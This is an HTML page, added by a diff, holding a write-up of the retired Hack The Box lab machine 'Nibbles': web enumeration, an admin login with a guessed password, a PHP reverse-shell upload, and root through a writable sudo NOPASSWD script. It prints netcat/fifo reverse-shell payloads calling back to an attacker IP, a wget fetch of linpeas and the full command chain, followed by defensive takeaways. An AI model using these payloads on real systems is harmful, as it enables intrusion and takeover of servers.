@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Nibbles - HTB Report</title>
+    <link rel="stylesheet" href="../style.css">
+  </head>
+
+  <body>
+    <header>
+      <h1>Nibbles</h1>
+      <p>Hack The Box Retired Machine Report</p>
+    </header>
+
+    <main class="report">
+      <h2>Machine Info</h2>
+      <p><strong>Difficulty:</strong> Easy</p>
+      <p><strong>Operating System:</strong> Linux</p>
+      <p><strong>Status:</strong> Retired</p>
+      <p><strong>Date Completed:</strong></p>
+
+      <h2>Summary</h2>
+      <p>
+        Nibbles is an easy Linux machine that focuses on web enumeration, credential discovery,
+        authenticated file upload abuse, and basic Linux privilege escalation. The initial foothold
+        was gained by discovering a hidden Nibbleblog directory, logging into the admin panel, and
+        uploading a PHP reverse shell through the image upload functionality. Privilege escalation was
+        achieved by abusing a sudo misconfiguration that allowed the low-privileged user to run a writable
+        script as root without a password.
+      </p>
+
+      <h2>Recon / Enumeration</h2>
+      <pre><code>nmap -sC -sV -oN nibbles.txt 10.129.11.14</code></pre>
+
+      <p>This scan found a total of 2 TCP ports open on the remote host.</p>
+
+      <table class="report-table">
+        <thead>
+          <tr>
+            <th>Port</th>
+            <th>Service</th>
+            <th>Version</th>
+            <th>Notes</th>
+            <th>Vulnerabilities</th>
+          </tr>
+        </thead>
+
+        <tbody>
+          <tr>
+            <td>22</td>
+            <td>SSH</td>
+            <td>OpenSSH 7.2p2</td>
+            <td>SSH was available, but it was not the initial attack path.</td>
+            <td>CVE-2016-6210 username enumeration was identified, but it was not needed for exploitation.</td>
+          </tr>
+
+          <tr>
+            <td>80</td>
+            <td>HTTP</td>
+            <td>Apache httpd 2.4.18</td>
+            <td>Hosted a simple web page with a hidden comment pointing to Nibbleblog.</td>
+            <td>Authenticated file upload abuse through Nibbleblog.</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h2>Initial Foothold</h2>
+      <p>
+        After the initial scan, I used <code>searchsploit</code> to check for potential vulnerabilities
+        affecting the identified version of OpenSSH. OpenSSH 7.2p2 has a known username enumeration issue,
+        CVE-2016-6210. However, this was not the main attack path for this machine.
+      </p>
+
+      <p>
+        I then moved on to the HTTP service. The website only displayed a simple <code>Hello World</code>
+        message. After inspecting the page source, I found the following HTML comment:
+      </p>
+
+      <pre><code>&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</code></pre>
+
+      <p>
+        This comment hinted at a hidden directory on the web server. I browsed to the
+        <code>/nibbleblog/</code> directory and then used Gobuster to enumerate additional files and
+        directories.
+      </p>
+
+      <pre><code>gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://nibbles.htb/nibbleblog</code></pre>
+
+      <p>The scan revealed several interesting paths:</p>
+
+      <pre><code>/README
+/admin
+/admin.php
+/content
+/index.php
+/languages
+/plugins
+/themes</code></pre>
+
+      <p>
+        I checked the <code>/README</code> file, but it did not contain anything useful. I then explored
+        the <code>/content</code> directory in the browser. Inside this directory, I found three folders:
+        <code>/private</code>, <code>/public</code>, and <code>/tmp</code>.
+      </p>
+
+      <p>
+        The <code>/private</code> directory contained two files that stood out:
+        <code>config.xml</code> and <code>users.xml</code>. The <code>users.xml</code> file confirmed
+        that the username <code>admin</code> existed on the Nibbleblog application. The
+        <code>config.xml</code> file contained multiple references to the word <code>nibbles</code>,
+        which looked like a possible password.
+      </p>
+
+      <p>
+        I attempted to log into the Nibbleblog admin panel using the username <code>admin</code> and
+        the password <code>nibbles</code>. This was successful and gave me access to the admin dashboard.
+        After exploring the available options, I found the <strong>My Image</strong> plugin, which allowed
+        image uploads.
+      </p>
+
+      <p>
+        Since the application allowed file uploads, I tested whether I could upload a PHP reverse shell.
+        I created a file named <code>image.php</code> with the following payload:
+      </p>
+
+      <pre><code>&lt;?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.209 4444 &gt;/tmp/f"); ?&gt;</code></pre>
+
+      <p>
+        Before triggering the file, I started a Netcat listener on my attacking machine:
+      </p>
+
+      <pre><code>nc -lvnp 4444</code></pre>
+
+      <p>
+        After uploading the PHP file, I used <code>curl</code> to access it from the web server. This
+        executed the payload and returned a reverse shell as the user <code>nibbler</code>.
+      </p>
+
+      <pre><code>curl http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php</code></pre>
+
+      <p>
+        Once I had a shell, I upgraded it using Python:
+      </p>
+
+      <pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+
+      <p>
+        At this point, I had a stable initial foothold as the user <code>nibbler</code>. I then navigated
+        to the user’s home directory and captured the user flag.
+      </p>
+
+      <pre><code>cat /home/nibbler/user.txt</code></pre>
+
+      <h2>Privilege Escalation</h2>
+      <p>
+        The next step was to escalate privileges and attempt to gain access to the root flag. I started
+        by checking the user’s home directory and found a file named <code>personal.zip</code>.
+      </p>
+
+      <pre><code>unzip personal.zip</code></pre>
+
+      <p>
+        After extracting the archive, I found a script named <code>monitor.sh</code>. This file was
+        interesting because scripts are often useful privilege escalation targets if they can be executed
+        with higher privileges.
+      </p>
+
+      <p>
+        I also downloaded and ran <code>linpeas.sh</code> to help identify possible privilege escalation
+        paths. On my attacking machine, I started a Python HTTP server:
+      </p>
+
+      <pre><code>python3 -m http.server 8080</code></pre>
+
+      <p>
+        Then, from the target machine, I downloaded the script:
+      </p>
+
+      <pre><code>wget http://10.10.14.209:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh</code></pre>
+
+      <p>
+        While reviewing the LinPEAS results, I noticed that the user <code>nibbler</code> could run
+        <code>monitor.sh</code> as root without providing a password. This was confirmed with:
+      </p>
+
+      <pre><code>sudo -l</code></pre>
+
+      <p>
+        The output showed that <code>monitor.sh</code> could be executed with <code>NOPASSWD</code>.
+        Since I had write access to the script, I modified it to include a reverse shell payload.
+      </p>
+
+      <pre><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.209 4445 &gt;/tmp/f' | tee -a monitor.sh</code></pre>
+
+      <p>
+        I started another Netcat listener on my attacking machine:
+      </p>
+
+      <pre><code>nc -lvnp 4445</code></pre>
+
+      <p>
+        Then I executed the script with sudo:
+      </p>
+
+      <pre><code>sudo ./monitor.sh</code></pre>
+
+      <p>
+        This successfully returned a root shell. From there, I was able to capture the root flag.
+      </p>
+
+      <pre><code>cat /root/root.txt</code></pre>
+
+      <h2>Tools Used</h2>
+      <ul>
+        <li>Nmap</li>
+        <li>Searchsploit</li>
+        <li>Gobuster</li>
+        <li>Curl</li>
+        <li>Netcat</li>
+        <li>Python HTTP Server</li>
+        <li>LinPEAS</li>
+        <li>Linux command line tools</li>
+      </ul>
+
+      <h2>Important Commands</h2>
+      <pre><code>nmap -sC -sV -oN nibbles.txt 10.129.11.14
+
+gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://nibbles.htb/nibbleblog
+
+curl http://nibbles.htb/nibbleblog/README
+
+curl http://nibbles.htb/nibbleblog/content/private/users.xml
+
+curl http://nibbles.htb/nibbleblog/content/private/config.xml
+
+nc -lvnp 4444
+
+curl http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+python3 -m http.server 8080
+
+wget http://10.10.14.209:8080/linpeas.sh
+
+chmod +x linpeas.sh
+
+./linpeas.sh
+
+unzip personal.zip
+
+sudo -l
+
+nc -lvnp 4445
+
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.209 4445 &gt;/tmp/f' | tee -a monitor.sh
+
+sudo ./monitor.sh</code></pre>
+
+      <h2>Vulnerabilities / Misconfiguration</h2>
+      <p>
+        The main vulnerability on this machine was weak credential usage for the Nibbleblog admin panel.
+        The application exposed files that helped identify a valid username and hinted at a likely password.
+        Once authenticated, the image upload functionality allowed a PHP reverse shell to be uploaded and
+        executed on the server.
+      </p>
+
+      <p>
+        The privilege escalation path was caused by a sudo misconfiguration. The user
+        <code>nibbler</code> was allowed to run the <code>monitor.sh</code> script as root without a
+        password. Since the script was writable by the user, it could be modified to execute commands as
+        root.
+      </p>
+
+      <h2>Defensive Takeaways</h2>
+      <p>
+        Web applications should avoid exposing sensitive configuration files or user files through the web
+        root. Administrative panels should use strong passwords, account lockout protections, and should not
+        rely on predictable credentials. File upload functionality should validate file types, restrict
+        executable uploads, and store uploaded files in locations where server-side scripts cannot execute.
+      </p>
+
+      <p>
+        Sudo permissions should also be reviewed carefully. Users should not be allowed to run writable
+        scripts as root. If a script must be executed with elevated privileges, it should be owned by root,
+        should not be writable by low-privileged users, and should use absolute paths inside the script.
+      </p>
+
+      <h2>Lessons Learned</h2>
+      <p>
+        This machine reinforced the importance of checking page source code, enumerating hidden web
+        directories, and reviewing exposed application files. It also showed how weak credentials and
+        upload functionality can lead to remote code execution. For privilege escalation, I learned how
+        dangerous writable scripts can be when combined with sudo permissions and <code>NOPASSWD</code>.
+      </p>
+
+      <p>
+        I also gained more practice using tools like Gobuster, Curl, Netcat, LinPEAS, and basic Linux
+        enumeration commands to move from initial access to root access.
+      </p>
+
+      <p><a href="../index.html">Back to all reports</a></p>
+    </main>
+  </body>
+</html>
